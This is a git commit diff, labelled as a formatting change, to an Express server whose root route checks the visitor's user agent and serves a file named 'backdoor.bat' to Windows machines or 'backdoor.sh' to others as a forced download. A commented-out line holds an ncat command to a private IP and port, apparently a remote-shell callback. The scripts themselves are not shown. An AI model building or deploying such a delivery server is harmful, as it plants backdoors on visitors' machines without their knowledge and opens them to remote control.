bb360b0bfd3a08e735bb53ac5005815fb7dca684
furahaderick <yvesderricks@gmail.com>
2024-01-17 12:21:54 +0200

    style: Format code for better readability

--- server/index.js
+++ server/index.js
@@ -5,37 +5,42 @@ const path = require("path");
 const PORT = process.env.PORT || 3000;
 const app = express();
 app.use(
-  cors({
-    origin: "*",
-  })
+	cors({
+		origin: "*",
+	})
 );
 app.use(express.json());
 app.get("/", (req, res) => {
-  const userAgent = req.headers["user-agent"];
-  const isWindows = userAgent.toLowerCase().includes("windows");
+	const userAgent = req.headers["user-agent"];
+	const isWindows = userAgent.toLowerCase().includes("windows");
 
-  let filePath;
-  if (isWindows) {
-    filePath = path.join(__dirname, "backdoor.bat");
-    console.log("machine is windows");
-    res.setHeader("Content-Disposition", 'attachment; filename="backdoor.bat"');
-    console.log(filePath);
-  } else {
-    filePath = path.join(__dirname, "backdoor.sh");
-    res.setHeader("Content-Disposition", 'attachment; filename="backdoor.sh"');
-  }
-  res.sendFile(filePath, (err) => {
-    if (err) {
-      console.log(`Error while sending file`, err.message);
-    } else {
-      console.log(`File successfully sent!`);
-    }
-  });
-
+	let filePath;
+	if (isWindows) {
+		filePath = path.join(__dirname, "backdoor.bat");
+		console.log("machine is windows");
+		res.setHeader(
+			"Content-Disposition",
+			'attachment; filename="backdoor.bat"'
+		);
+		console.log(filePath);
+	} else {
+		filePath = path.join(__dirname, "backdoor.sh");
+		res.setHeader(
+			"Content-Disposition",
+			'attachment; filename="backdoor.sh"'
+		);
+	}
+	res.sendFile(filePath, (err) => {
+		if (err) {
+			console.log(`Error while sending file`, err.message);
+		} else {
+			console.log(`File successfully sent!`);
+		}
+	});
 });
 
 app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+	console.log(`Server listening on port ${PORT}`);
 });
 
 // let netcatCommand = "ncat -nv 192.168.3.67 5214";
